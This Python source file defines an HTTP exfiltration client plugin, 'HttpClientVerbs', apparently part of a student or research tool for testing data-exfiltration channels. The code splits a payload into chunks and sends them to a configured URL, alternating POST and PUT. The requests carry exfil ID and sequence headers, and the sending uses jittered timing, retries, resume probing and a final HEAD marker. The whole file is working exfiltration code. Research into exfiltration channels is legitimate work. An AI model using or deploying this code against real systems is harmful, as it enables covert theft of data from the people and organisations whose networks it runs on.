from __future__ import annotations
from typing import Dict, Any, Iterable
import urllib.request, urllib.error
import time, random

from tfg.plugins.api import ExfilClientPlugin

class HttpClientVerbs(ExfilClientPlugin):
    canal = "HTTP"
    metodo = 2
    name = "http_client_verbs"

    def _send_with_retries(self, req: urllib.request.Request, timeout: int, retries: int, backoff_ms: int) -> bytes:
        last_exc: Exception | None = None
        for attempt in range(retries + 1):
            try:
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    return resp.read()
            except Exception as e:
                last_exc = e
                if attempt >= retries:
                    break
                time.sleep(((2 ** attempt) * backoff_ms) / 1000.0)
        raise last_exc  # type: ignore

    def _status_probe(self, url: str, exfil_id: str, timeout: int, auth_token: str | None) -> int:
        headers = {"X-Exfil-Id": exfil_id, "X-Exfil-Status": "1"}
        if auth_token:
            headers["X-Auth-Token"] = auth_token
        req = urllib.request.Request(url=url, data=None, headers=headers, method="HEAD")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return int(resp.headers.get("X-Exfil-Next-Seq") or "0")
        except Exception:
            return 0

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        url = config.get("url")
        if not url:
            raise ValueError("Falta 'url' en config para HttpClientVerbs")
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        timeout = int(config.get("timeout_s") or 10)
        user_agent = config.get("user_agent") or "TFG-Exfil/1.1"
        auth_token = config.get("auth_token")
        retries = int(config.get("retries") or 3)
        backoff_ms = int(config.get("retry_backoff_ms") or 250)
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
        resume_probe = bool(config.get("resume_probe") or False)

        next_seq = 0
        if resume_probe:
            next_seq = self._status_probe(url, exfil_id, timeout, auth_token)

        sent_bytes = 0
        sent_frags = 0
        seq = 0
        for chunk in payload_iter:
            if seq < next_seq:
                seq += 1
                continue
            if ritmo_base or ritmo_disp:
                jitter = random.uniform(-ritmo_disp, ritmo_disp)
                time.sleep(max(0.0, (ritmo_base + jitter)/1000.0))

            method = "POST" if (seq % 2 == 0) else "PUT"
            headers = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id, "X-Exfil-Seq": str(seq), "Content-Type": "application/octet-stream"}
            if auth_token:
                headers["X-Auth-Token"] = auth_token
            req = urllib.request.Request(url=url, data=chunk, headers=headers, method=method)
            _ = self._send_with_retries(req, timeout, retries, backoff_ms)

            sent_bytes += len(chunk)
            sent_frags += 1
            seq += 1

        headers = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id, "X-Exfil-Seq": str(seq), "X-Exfil-Last": "1"}
        if auth_token:
            headers["X-Auth-Token"] = auth_token
        req = urllib.request.Request(url=url, data=None, headers=headers, method="HEAD")
        _ = self._send_with_retries(req, timeout, retries, backoff_ms)

        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_bytes": sent_bytes, "sent_fragments": sent_frags}
